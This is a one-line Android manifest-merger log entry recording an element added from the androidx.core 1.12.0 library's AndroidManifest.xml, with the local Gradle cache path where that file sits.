 		ADDED from [androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:22-94
